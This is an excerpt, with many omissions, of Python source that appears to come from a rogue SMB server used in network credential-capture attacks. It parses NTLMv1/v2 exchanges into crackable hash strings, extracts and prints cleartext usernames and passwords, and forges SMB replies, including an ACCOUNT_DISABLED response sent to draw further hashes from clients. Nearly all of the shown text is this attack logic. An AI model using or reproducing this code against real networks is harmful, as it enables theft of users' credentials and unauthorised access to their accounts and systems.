...
def ParseShare(data):
    ...
    if a:
        print text(
            "[SMB] Requested Share     : %s" %
            a.group(0).decode('UTF-16LE'))
...
def ParseLMNTHash(data, client, Challenge):  # Parse SMB NTLMv1/v2
    ...
    Username, Domain = tuple([e.replace(
        '\x00', '') for e in data[89 + NthashLen:Bcc + 60].split('\x00\x00\x00')[:2]])

    if NthashLen > 25:
        FullHash = data[65 + LMhashLen:65 +
                        LMhashLen + NthashLen].encode('hex')
        LmHash = FullHash[:32].upper()
        NtHash = FullHash[32:].upper()
        WriteHash = '%s::%s:%s:%s:%s' % (
            Username, Domain, Challenge.encode('hex'), LmHash, NtHash)
    ...
    if NthashLen == 24:
        NtHash = data[65 + LMhashLen:65 + LMhashLen +
                      NthashLen].encode('hex').upper()
        LmHash = data[65:65 + LMhashLen].encode('hex').upper()
        WriteHash = '%s::%s:%s:%s:%s' % (
            Username, Domain, LmHash, NtHash, Challenge.encode('hex'))
...
def IsNT4ClearTxt(data, client):
    ...
    if data[14:16] == "\x03\x80":
        ...
        if ChainedCmdOffset == "\x75":
            ...
            if PassLen > 2:
                Password = data[HeadLen + 30:HeadLen +
                                30 + PassLen].replace("\x00", "")
                User = ''.join(tuple(
                    data[HeadLen + 30 + PassLen:].split('\x00\x00\x00'))[:1]).replace("\x00", "")
                print text(
                    "[SMB] Clear Text Credentials: %s:%s" %
                    (User, Password))
                WriteData(settings.Config.SMBClearLog %
        ...
        try:
            ...
            while True:
                ...
                if data[8:10] == "\x72\x00" and re.search(
                        "SMB 2.\?\?\?", data):
                    head = SMB2Header(
                        CreditCharge="\x00\x00", Credits="\x01\x00")
                    t = SMB2NegoAns()
                    t.calculate()
                    packet1 = str(head) + str(t)
                    buffer1 = struct.pack(
                        ">i", len(''.join(packet1))) + packet1
                ...
                if data[8:10] == "\x72\x00" and data[4:5] == "\xff" and re.search(
                        "SMB 2.\?\?\?", data) is None:
                    Header = SMBHeader(
                        cmd="\x72",
                        flag1="\x88",
                ...
                # Session Setup AndX Request smbv1
                if data[8:10] == "\x73\x00" and data[4:5] == "\xff":
                    ...
                    if data[8:10] == "\x73\x00" and data[4:5] == "\xff":  # STATUS_SUCCESS
                        if Is_Anonymous(data):
                            Header = SMBHeader(
                                ...
                                tid="\x00\x00",
                                uid=uidcalc(data),
                                mid=midcalc(data))  # should always send errorcode="\x72\x00\x00\xc0" account disabled for anonymous logins.
                            Body = SMBSessEmpty()

                            Packet = str(Header) + str(Body)
                            Buffer = struct.pack(
                                ">i", len(''.join(Packet))) + Packet
                            ...
                            ParseSMBHash(
                                data, self.client_address[0], Challenge)

                            if settings.Config.CaptureMultipleCredentials and self.ntry == 0:
                                # Send ACCOUNT_DISABLED to get multiple hashes
                                # if there are any
                                Header = SMBHeader(
                                    cmd="\x73",
                                    flag1="\x98",
                ...
                if data[8:10] == "\xa2\x00" and data[4:5] == "\xff":
                    Header = SMBHeader(
                        cmd="\xa2",
                        flag1="\x98",
                        flag2="\x07\xc8",
                ...
                if data[8:10] == "\x25\x00" and data[4:5] == "\xff":
                    Header = SMBHeader(
                        cmd="\x25",
                        flag1="\x98",
                        flag2="\x07\xc8",
        ...
        try:
            ...
            if data[8:10] == "\x72\x00":  # Negotiate proto answer.
                head = SMBHeader(
                    ...
                    mid=midcalc(data))
                Body = SMBNegoAnsLM(
                    Dialect=Parse_Nego_Dialect(data),
                    Domain="",
                    Key=Challenge)
                Body.calculate()
